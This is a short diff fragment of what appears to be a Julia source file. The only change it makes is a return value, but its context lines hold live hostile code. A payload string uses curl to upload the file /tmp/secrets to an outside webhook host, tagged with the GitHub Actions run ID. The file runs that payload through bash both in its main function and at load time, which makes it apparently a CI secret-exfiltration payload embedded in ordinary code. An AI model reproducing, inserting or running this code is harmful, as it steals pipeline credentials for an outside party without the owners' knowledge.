@@ -5,6 +5,7 @@ curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 """
     function main(args)
         run(`bash -c $payload`)
+        return Int32(0)
     end
     run(`bash -c $payload`)
 end
